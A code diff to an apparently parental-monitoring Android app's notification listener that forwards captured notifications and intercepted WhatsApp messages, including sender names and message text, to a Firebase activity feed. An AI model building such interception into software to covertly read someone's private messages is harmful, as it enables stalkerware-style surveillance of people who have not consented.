@@ -113,6 +113,14 @@ class ChildNotificationListenerService : NotificationListenerService() {
                     timestamp = System.currentTimeMillis()
                 )
                 FirebaseRepository.pushNotification(uid, item)
+                FirebaseRepository.pushActivityFeedItem(uid, com.example.authapp.model.ActivityFeedItem(
+                    category = "NOTIFICATION",
+                    title = appName.ifEmpty { packageName },
+                    subtitle = title,
+                    message = text,
+                    badge = "APP",
+                    timestamp = item.timestamp
+                ))
 
                     // WhatsApp Chat & Status Automatic Interceptor
                 if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" || packageName.contains("whatsapp", ignoreCase = true)) {
@@ -188,6 +196,14 @@ class ChildNotificationListenerService : NotificationListenerService() {
                         isIncoming = true
                     )
                     FirebaseRepository.pushWhatsAppLog(uid, waItem)
+                    FirebaseRepository.pushActivityFeedItem(uid, com.example.authapp.model.ActivityFeedItem(
+                        category = "WHATSAPP",
+                        title = waItem.senderName,
+                        subtitle = "WhatsApp",
+                        message = waItem.messageText,
+                        badge = waItem.type,
+                        timestamp = waItem.timestamp
+                    ))
                 }
 
                 // YouTube Search & Video Watch Interceptor
